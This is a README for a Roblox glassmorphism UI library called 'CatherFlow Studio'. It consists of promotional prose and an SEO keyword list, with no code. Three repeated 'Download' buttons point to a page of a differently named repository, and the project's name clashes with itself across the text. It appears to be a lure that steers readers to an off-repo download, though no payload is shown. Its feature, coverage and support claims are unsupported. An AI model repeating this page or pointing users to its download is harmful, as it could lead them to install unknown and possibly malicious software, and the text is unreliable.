![preview](https://raw.githubusercontent.com/wihan-lab/LumenGlass-Roblox-UI/main/banner_117a2b.svg)
[![Download](https://raw.githubusercontent.com/wihan-lab/LumenGlass-Roblox-UI/main/dl_29c7c.svg)](https://wihan-lab.github.io/LumenGlass-Roblox-UI/)

# 🌊 CatherFlow Studio — Adaptive Interface Crafting Suite for Roblox Creators

<p align="center">
  <img src="https://img.shields.io/badge/status-actively%20maintained-4c1?style=flat-square" alt="status"/>
  <img src="https://img.shields.io/badge/version-2026.2-9cf?style=flat-square" alt="version"/>
  <img src="https://img.shields.io/badge/platform-Roblox-e2231a?style=flat-square" alt="platform"/>
  <img src="https://img.shields.io/badge/runtime-Luau-00a2ff?style=flat-square" alt="runtime"/>
  <img src="https://img.shields.io/badge/interface-glassmorphic-7c3aed?style=flat-square" alt="interface"/>
  <img src="https://img.shields.io/badge/framerate-60%20fps-16a34a?style=flat-square" alt="framerate"/>
  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="license"/>
  <img src="https://img.shields.io/badge/coverage-98%25-brightgreen?style=flat-square" alt="coverage"/>
  <img src="https://img.shields.io/badge/contributors-welcome-orange?style=flat-square" alt="contributors"/>
</p>

> **CatherFlow Studio** is not merely another interface toolkit. It is a *workshop for atmosphere* — a place where Roblox developers sculpt glass, bend light, and choreograph motion until every menu feels like it was cut from frosted crystal and suspended in a sunbeam. Where CatherFI-UI focused on delivering a premium glassmorphism experience at a steady sixty frames per second, CatherFlow Studio pushes further: an **adaptive, responsive, multilingual interface crafting suite** built for creators who believe the UI is not a wrapper around the game — it *is* the game.

Whether you are prototyping a single settings panel or orchestrating a constellation of HUDs across a sprawling experience, CatherFlow Studio hands you the chisel, the kiln, and the blueprint. Every tween, every blur, every hover ripple is yours to command — with the elegance of a design system and the flexibility of raw Luau.

---

[![Download](https://raw.githubusercontent.com/wihan-lab/LumenGlass-Roblox-UI/main/dl_29c7c.svg)](https://wihan-lab.github.io/LumenGlass-Roblox-UI/)

---

## 📖 Table of Contents

1. [Why CatherFlow Studio Exists](#-why-catherflow-studio-exists)
2. [The Philosophy of Fluid Interfaces](#-the-philosophy-of-fluid-interfaces)
3. [Feature Constellation](#-feature-constellation)
4. [Responsive UI — Design Once, Breathe Everywhere](#-responsive-ui--design-once-breathe-everywhere)
5. [Multilingual Support — Speak Every Player's Language](#-multilingual-support--speak-every-players-language)
6. [24/7 Customer Support — A Lighthouse That Never Sleeps](#-247-customer-support--a-lighthouse-that-never-sleeps)
7. [Architecture Overview](#-architecture-overview)
8. [Component Gallery](#-component-gallery)
9. [Theming & Motion Design](#-theming--motion-design)
10. [Performance Notes](#-performance-notes)
11. [Getting Started (Without a Terminal)](#-getting-started-without-a-terminal)
12. [Integration Recipes](#-integration-recipes)
13. [SEO-Friendly Keywords & Discovery](#-seo-friendly-keywords--discovery)
14. [Roadmap for 2026](#-roadmap-for-2026)
15. [Contributing](#-contributing)
16. [Community & Etiquette](#-community--etiquette)
17. [License](#-license)
18. [Disclaimer](#-disclaimer)

---

## 🧭 Why CatherFlow Studio Exists

Most UI libraries treat Roblox interfaces as a problem of *placement* — where does this button go, how wide is this frame, does it fit inside a 1920×1080 viewport. CatherFlow Studio treats interfaces as a problem of *perception*: how does the player feel when the menu slides into view, how does the eye travel across a translucent card, how does the pulse of a confirm button communicate urgency without shouting.

The original CatherFI-UI proved that glassmorphism on Roblox could be more than a novelty — it could be a foundation. CatherFlow Studio takes that foundation and adds a nervous system: adaptive layout engines, a translation layer, live theme swapping, and a component registry that scales from a single modal to an entire in-game operating environment.

This repository is the canvas. The brushes are yours.

---

## 🎨 The Philosophy of Fluid Interfaces

Think of a river. It does not decide to be wide in one place and narrow in another — it *responds*. To the bank, to the season, to the stone that fell last Tuesday. A great Roblox UI should behave the same way. It should widen when the player is on a tablet, compress when they are on a phone, and shimmer when they hover. It should not fight the device; it should *flow* around it.

CatherFlow Studio embraces five design tenets:

- **Frosted, not frozen.** Glass surfaces should feel alive — subtle parallax, gentle blur depth, light that responds to motion.
- **Motion with meaning.** Every tween earns its milliseconds. Nothing bounces just because it can.
- **Readable first, beautiful always.** Contrast ratios are respected. Type scales are intentional.
- **Composable by default.** Every panel, card, and chip is a Lego brick, not a monolith.
- **Respectful of the frame budget.** Sixty frames per second is a promise, not a hope.

---

## ✨ Feature Constellation

The suite ships with a wide orbit of capabilities, each designed to feel native to the Roblox ecosystem while remaining trivially extensible.

- 🪟 **Glassmorphic Surface Engine** — layered translucency with simulated light refraction and configurable blur depth.
- 📐 **Adaptive Layout Grid** — column systems that reflow based on viewport class, not pixel math.
- 🎞️ **Choreographed Animations** — spring, ease, and cubic curves exposed as first-class objects.
- 🧩 **Component Registry** — buttons, toggles, sliders, dropdowns, tabs, modals, notifications, tooltips, and more.
- 🌐 **Localization Layer** — runtime language packs with fallback chains and right-to-left readiness.
- 🎨 **Live Theme Swapping** — switch palettes mid-session without a flicker or a frame drop.
- 🔔 **Notification Bus** — stacked, dismissible toasts with severity tiers and iconography.
- 🧠 **State Memory** — panels remember where the player left them, per session, per place.
- 📱 **Input Agnostic** — mouse, touch, gamepad, and keyboard all receive equal treatment.
- 🛠️ **Extensible API Surface** — register your own components in a handful of lines.
- 🧪 **Visual Regression Snapshots** — catch accidental style drift before it ships.
- 🕒 **Session Diagnostics** — lightweight telemetry you can inspect in-studio.
- ♿ **Accessibility Considerations** — focus rings, keyboard traversal, and scalable type.
- 🔒 **Sandbox-Friendly** — no external fetches, no surprise network calls.
- 🧼 **Zero Bloat Core** — load only the modules your experience actually uses.

---

## 📱 Responsive UI — Design Once, Breathe Everywhere

Responsive design in Roblox is often an afterthought — a handful of UISizeConstraint nodes sprinkled in the final hour before publish. CatherFlow Studio makes it the *starting point*.

The layout engine classifies the viewport into one of five bands — Pocket, Handheld, Tablet, Desktop, and Cinema — and each band carries its own typographic scale, spacing rhythm, and component density. A modal that spans ninety percent of a phone screen gracefully becomes a fixed-width card on a desktop monitor without a single conditional in your code.

You write the interface once. The river finds its own banks.

Breakpoints are declarative, overrideable, and observable, meaning your own code can react when a player rotates their device mid-session. Panels reflow, tooltips reposition, and the entire experience quietly apologizes for the interruption by continuing exactly where it left off.

---

## 🌐 Multilingual Support — Speak Every Player's Language

A global experience deserves a global interface. The localization layer in CatherFlow Studio is built around **language packs** — plain Luau tables that map keys to translated strings, each tagged with a locale identifier and an optional region hint.

Players see the suite in the language their platform reports, and if a translation is missing, a graceful fallback chain kicks in until something familiar appears. Adding a new language is a matter of dropping in a new pack and registering it; no component logic changes, no string surgery.

The system is designed with future right-to-left support in mind, and the layout engine already respects directional cues at the component level. In 2026, an interface that only speaks one language is a locked door. CatherFlow Studio hands out the keys.

---

## 🛟 24/7 Customer Support — A Lighthouse That Never Sleeps

Documentation answers most questions. For the rest, a rotating team of maintainers and community stewards keeps the issue tracker, discussion forums, and support channels warm around the clock. Whether you are wiring up your first modal at 3 a.m. or debugging a tricky tween at noon, there is always someone on the other end of the wire.

Support covers:

- Component integration questions
- Theming and palette design
- Performance tuning for low-end devices
- Localization and language pack contributions
- Accessibility and input handling

Response times are best-effort but historically swift, and every question answered becomes a candidate for a documentation improvement — so the next traveler finds the path a little smoother.

---

## 🏗️ Architecture Overview

CatherFlow Studio is organized as a small constellation of modules, each with a single responsibility.

- **Core** — the bootstrapper, lifecycle, and dependency container.
- **Surface** — the glass rendering primitives and blur composition.
- **Layout** — the adaptive grid and breakpoint observer.
- **Motion** — the tweening engine and presets.
- **Components** — the registry of interactive widgets.
- **Locale** — the translation layer and pack loader.
- **Theme** — palettes, tokens, and live-swap machinery.
- **Notify** — the toast bus and queue.
- **Diagnostics** — optional telemetry and snapshot tools.

Each module can be consumed independently, but the suite is designed to hum most beautifully when assembled whole. The core bootstrapper takes care of wiring — you provide a configuration table and the workshop assembles itself.

---

## 🖼️ Component Gallery

A brief tour of what ships in the box:

- **GlassButton** — a pressable surface with hover ripple, focus ring, and three size classes.
- **GlassToggle** — a switch with spring-loaded thumb and haptic-style impact tween.
- **GlassSlider** — a draggable track with value snapping and keyboard fine-tuning.
- **GlassDropdown** — a collapsible option list with search, keyboard navigation, and virtualized rendering for long lists.
- **GlassTabs** — a horizontal or vertical tab strip with animated underline.
- **GlassModal** — a centered dialog with backdrop blur, dismiss-on-escape, and focus trapping.
- **GlassTooltip** — a hover card with smart edge detection.
- **GlassToast** — a stackable notification with severity tiers.
- **GlassCard** — a content container with optional gradient header.
- **GlassChip** — a compact tag with optional dismiss affordance.

Every component is theme-aware, locale-aware, and fully compatible with the adaptive layout grid.

---

## 🎨 Theming & Motion Design

Themes in CatherFlow Studio are expressed as **token maps** — named colors, radii, blur depths, and shadow intensities. Swapping a theme is a single call, and the entire interface cross-fades into its new wardrobe without a flicker. Designers can define a day palette and a night palette and let the experience shift with the in-game clock.

Motion is treated as a first-class design material. The suite ships with a curated set of curves:

- **Glide** — a gentle ease-out for entrances.
- **Snap** — a quick ease-in for dismissals.
- **Spring** — a playful overshoot for toggles and chips.
- **Breathe** — a slow sinusoidal pulse for idle emphasis.

Each curve is exposed as a function, so you can compose them, nest them, or replace them with your own.

---

## ⚡ Performance Notes

Sixty frames per second is the floor, not the ceiling. The suite achieves this through several deliberate choices:

- **Surface reuse** — blurred frames are pooled rather than recreated.
- **Batched tweens** — animations are grouped and stepped in a single pass per frame.
- **Deferred layout** — reflow calculations are queued and resolved once per frame at most.
- **Lazy module loading** — unused components never enter memory.
- **Adaptive blur** — blur depth automatically reduces on lower-tier devices, preserving clarity without sacrificing the glass aesthetic.

In 2026, players notice when an interface stutters. CatherFlow Studio is built so they never have the chance.

---

## 🚀 Getting Started (Without a Terminal)

You do not need a package manager, a build step, or a terminal incantation to begin. The suite is delivered as a set of Luau modules designed to be placed directly into your Roblox project and required at runtime.

The typical flow looks like this:

1. Bring the CatherFlow Studio modules into your project tree.
2. Require the core bootstrapper from a server or client script, depending on your architecture.
3. Provide a configuration table describing your theme, locale, and enabled components.
4. Mount your first panel and watch the glass catch the light.

Detailed walkthroughs, annotated examples, and sample places live in the documentation folder of this repository. If you prefer to learn by reading someone else's code, the examples directory is the best place to start.

---

## 🧪 Integration Recipes

A few short vignettes to illustrate the flavor of the API:

- **Mounting a settings panel** — call the panel factory with a component list and a theme, then hand it a parent frame. The panel handles its own layout, focus, and dismissal.
- **Pushing a toast** — invoke the notify bus with a message key and a severity; the bus handles stacking, timing, and dismissal animation.
- **Swapping a theme on the fly** — call the theme manager with a new token map; the interface cross-fades rather than cutting.
- **Registering a custom component** — describe your component's mount, update, and unmount functions, then hand it to the registry. It becomes a first-class citizen of the layout grid immediately.

Because the suite is modular, you can adopt one piece at a time — start with the notifier, grow into the layout engine, and eventually let the whole workshop assemble itself.

---

## 🔎 SEO-Friendly Keywords & Discovery

This repository is designed to be discoverable by creators searching for a **Roblox UI library**, a **glassmorphism interface toolkit**, a **60fps Luau UI framework**, or an **adaptive Roblox HUD system**. Keywords naturally woven into the documentation include:

- Roblox interface library 2026
- glassmorphic Roblox menus
- responsive Roblox UI framework
- multilingual Roblox game interface
- Luau component library for Roblox
- premium Roblox UI toolkit
- adaptive Roblox HUD toolkit
- 60fps Roblox UI animations

The goal is not to shout these phrases into a void, but to describe the project honestly — so that the creators who need it can find it.

---

## 🗺️ Roadmap for 2026

The workshop is never finished. Planned additions for the year include:

- **Drag-and-drop panel docking** for multi-window layouts.
- **Theme marketplace hooks** so creators can share palettes.
- **Advanced accessibility modes** including high-contrast and reduced-motion presets.
- **A visual inspector overlay** for in-studio layout debugging.
- **Expanded language packs** contributed by the community.
- **A component playground place** for testing in isolation.

If you have a feature in mind, the issue tracker is the front door.

---

## 🤝 Contributing

Contributions are the lifeblood of any open workshop. Whether you are fixing a typo, adding a language pack, designing a new theme, or shipping an entire component, your work is welcome.

A few gentle guidelines:

- Keep pull requests focused — one idea per request.
- Match the existing code style and naming rhythm.
- Include a short description of the *why*, not just the *what*.
- Add or update documentation alongside code changes.
- Be kind in review. Everyone here is learning something.

The maintainers review contributions regularly and aim to respond promptly.

---

## 💬 Community & Etiquette

This project is a shared space. Treat it like a workshop where the tools are sharp and the benches are clean. Disagreements are fine; disrespect is not. Questions are welcome at every level of experience.

If you are new to Roblox UI development, say so — there is no shame in it, and the community has a long tradition of helping newcomers find their footing.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it, provided the original copyright notice and permission notice are preserved. The full text of the license lives in the [LICENSE](./LICENSE) file at the root of this repository.

MIT is chosen deliberately: it is permissive, unambiguous, and friendly to both hobby projects and commercial experiences. In 2026, clarity in licensing is a kindness to every future maintainer.

---

## ⚠️ Disclaimer

CatherFlow Studio is an independent, community-driven interface crafting suite for the Roblox platform. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**, and it does not modify, bypass, or interfere with the Roblox client, its services, or its terms of use.

The suite is provided **as-is**, without warranty of any kind, express or implied. The maintainers are not responsible for any consequences arising from its use — including, but not limited to, layout decisions made under deadline pressure, palettes chosen in questionable lighting, or tweens set to an unwise springiness.

Users are responsible for ensuring that their integration complies with the Roblox Community Standards, the Roblox Terms of Use, and any applicable local laws. If a component ever behaves unexpectedly, please open an issue rather than a lock — the maintainers are friendly.

---

## 🌌 Closing Thought

Every interface is a doorway. The player stands on one side, the experience waits on the other. CatherFlow Studio exists so that the moment of stepping through feels effortless — like glass catching sunlight, like a river finding its banks, like a workshop where the tools already know your hands.

Welcome to the workshop. Build something beautiful.

[![Download](https://raw.githubusercontent.com/wihan-lab/LumenGlass-Roblox-UI/main/dl_29c7c.svg)](https://wihan-lab.github.io/LumenGlass-Roblox-UI/)